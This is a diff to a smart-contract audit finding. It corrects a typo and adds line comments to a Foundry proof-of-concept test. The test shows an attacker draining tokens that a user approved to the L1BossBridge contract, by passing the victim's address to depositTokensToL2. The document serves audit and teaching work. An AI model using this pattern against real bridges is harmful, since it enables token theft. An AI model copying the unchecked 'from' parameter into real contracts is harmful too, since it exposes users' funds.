@@ -1,4 +1,4 @@
-### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assest stolen
+### [H-1] Users who give tokens approvals to `L1BossBridge` may have those assets stolen
 
 **Description:** The `depositTokensToL2` function allows anyone to call it with a from address of any account that has approved tokens to the bridge.
 
@@ -10,17 +10,17 @@ As a PoC, include the following test in the `L1BossBridge.t.sol` file:
 
 ```javascript
 function testCanMoveApprovedTokensOfOtherUsers() public {
-    vm.prank(user);
-    token.approve(address(tokenBridge), type(uint256).max);
+    vm.prank(user); // The user is impersonated to execute the next transaction.
+    token.approve(address(tokenBridge), type(uint256).max); // The user approves the tokenBridge contract to spend an unlimited amount of their tokens (type(uint256).max).
 
-    uint256 depositAmount = token.balanceOf(user);
+    uint256 depositAmount = token.balanceOf(user); // Retrieves the total token balance of the user. This will be the amount the attacker attempts to transfer.
     vm.startPrank(attacker);
-    vm.expectEmit(address(tokenBridge));
+    vm.expectEmit(address(tokenBridge)); // Prepares the test to expect an event (Deposit) emitted by the tokenBridge contract. This event likely records the user as the source of the deposit, attackerInL2 as the L2 recipient, and depositAmount as the amount.
     emit Deposit(user, attackerInL2, depositAmount);
-    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount);
+    tokenBridge.depositTokensToL2(user, attackerInL2, depositAmount); // The attacker uses the tokenBridge contract to move the user's tokens to an L2 address controlled by the attacker (attackerInL2).
 
     assertEq(token.balanceOf(user), 0);
-    assertEq(token.balanceOf(address(vault)), depositAmount);
+    assertEq(token.balanceOf(address(vault)), depositAmount); // Verifies that the deposited tokens are now stored in the vault (or the contract handling the tokens for the bridge).
     vm.stopPrank();
 }
 ```
